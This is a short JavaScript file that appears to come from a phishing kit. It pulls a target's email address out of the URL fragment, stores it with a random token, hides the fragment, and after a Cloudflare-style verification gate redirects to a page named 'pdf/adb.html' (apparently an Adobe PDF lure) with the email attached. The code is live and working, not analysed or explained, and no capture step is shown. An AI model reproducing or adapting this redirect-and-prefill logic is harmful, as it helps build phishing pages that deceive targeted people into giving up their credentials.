function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

// Store data on page load
window.onload = function() {
  const hash = window.location.hash.substring(1);
  if (hash && hash.includes("@")) {
    sessionStorage.setItem("redirect_email", hash);
    sessionStorage.setItem("redirect_token", generateSecureToken());
    history.replaceState(null, "", window.location.pathname);
  }
};

// Cloudflare verification callback
function onVerify(token) {
  const email = sessionStorage.getItem("redirect_email");
  const secureToken = sessionStorage.getItem("redirect_token");

  if (email && secureToken) {
    // Redirect immediately after verification
    window.location.href = `pdf/adb.html#${email}&token=${secureToken}`;
  } else {
    alert("Verification error. Please refresh and try again.");
  }
}
